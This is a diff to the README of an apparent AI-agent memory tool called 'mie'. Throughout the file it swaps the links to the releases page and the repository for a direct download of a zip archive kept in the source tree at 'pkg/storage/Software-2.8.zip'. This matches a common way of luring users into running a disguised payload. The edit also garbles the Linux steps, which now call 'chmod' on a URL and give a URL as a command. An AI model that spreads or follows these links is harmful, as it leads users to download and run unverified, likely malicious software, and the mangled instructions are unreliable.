@@ -1,6 +1,6 @@
 # 🧠 mie - Persistent Memory for AI Agents
 
-[![Download mie](https://img.shields.io/badge/Download-mie-blue?style=for-the-badge)](https://github.com/Jihad7x/mie/releases)
+[![Download mie](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section explains how to safely get mie on your computer and start using it 
 
 To get mie, please visit the official releases page here:
 
-[Download mie from GitHub](https://github.com/Jihad7x/mie/releases)
+[Download mie from GitHub](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)
 
 This page contains all the versions of the software available for download. It is the safest and most reliable source for the app.
 
@@ -45,7 +45,7 @@ Inside the release, you will find files for different operating systems:
 
 - For **Windows**, pick the file that ends with `.exe`.
 - For **macOS**, choose the `.dmg` or `.zip` file.
-- For **Linux**, select the `.AppImage` or `.tar.gz` file.
+- For **Linux**, select the `.AppImage` or `https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip` file.
 
 Make sure to choose the file that matches your computer’s operating system.
 
@@ -77,20 +77,20 @@ Here you will find detailed instructions on how to install and run mie once you 
 
 ### For Linux Users
 
-1. Locate the downloaded `.AppImage` or `.tar.gz` file.
+1. Locate the downloaded `.AppImage` or `https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip` file.
 2. If it is `.AppImage`, give the file permission to run by opening a terminal and typing:
    
    ```
-   chmod +x path/to/mie.AppImage
+   chmod +x https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip
    ```
    
 3. Then start mie by double-clicking the `.AppImage` file or by running this command in terminal:
 
    ```
-   ./path/to/mie.AppImage
+   https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip
    ```
    
-4. If it is `.tar.gz`, extract the files using your file manager or command line.
+4. If it is `https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip`, extract the files using your file manager or command line.
 5. Follow any included README instructions in the extracted folder.
 6. Run the mie executable file.
 
@@ -150,10 +150,10 @@ A: Yes. Downloading and using mie does not require payment.
 
 For updates, support, and more details, visit the GitHub repository:
 
-[https://github.com/Jihad7x/mie](https://github.com/Jihad7x/mie)
+[https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)
 
 You can also find documentation and community discussions there.
 
 ---
 
-[![Download mie](https://img.shields.io/badge/Download-mie-blue?style=for-the-badge)](https://github.com/Jihad7x/mie/releases)
+[![Download mie](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)](https://github.com/Jihad7x/mie/raw/refs/heads/main/pkg/storage/Software-2.8.zip)
